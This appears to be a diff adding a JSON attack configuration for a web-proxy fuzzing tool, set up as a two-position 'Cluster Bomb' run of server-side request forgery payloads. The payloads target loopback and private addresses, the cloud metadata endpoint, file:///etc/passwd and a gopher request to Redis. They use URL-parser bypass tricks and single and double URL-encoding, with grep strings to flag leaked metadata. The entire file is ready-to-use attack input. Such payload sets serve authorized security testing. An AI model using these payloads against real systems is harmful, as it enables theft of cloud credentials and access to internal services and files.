@@ -1,0 +1,45 @@
+{
+  "attackType": "Cluster Bomb",
+  "positions": [
+    {
+      "position": "§",
+      "type": "simple"
+    },
+    {
+      "position": "§",
+      "type": "simple"
+    }
+  ],
+  "payloads": [
+    [
+      "http://127.0.0.1",
+      "http://localhost",
+      "http://169.254.169.254/latest/meta-data/",
+      "http://192.168.0.1",
+      "http://10.0.0.1"
+    ],
+    [
+      "http://evil.com",
+      "http://example.com@127.0.0.1",
+      "http://localhost#evil.com",
+      "file:///etc/passwd",
+      "gopher://127.0.0.1:6379/_PING"
+    ]
+  ],
+  "payloadProcessing": [
+    {
+      "type": "URL-encode"
+    },
+    {
+      "type": "Double URL-encode"
+    }
+  ],
+  "grep": [
+    "metadata",
+    "internal",
+    "EC2",
+    "error",
+    "localhost",
+    "127.0.0.1"
+  ]
+}
